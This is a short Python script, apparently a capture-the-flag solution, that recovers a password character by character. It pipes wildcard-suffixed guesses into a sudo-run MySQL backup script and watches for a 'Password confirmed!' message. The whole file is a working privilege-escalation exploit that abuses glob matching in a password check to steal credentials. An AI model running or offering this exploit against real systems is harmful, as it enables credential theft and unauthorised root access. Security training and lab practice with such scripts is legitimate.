import string
import subprocess

all_characters_and_numbers = list(string.ascii_letters + string.digits)

password = ""
found = False

while not found:
    for character in all_characters_and_numbers:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
        print(password)
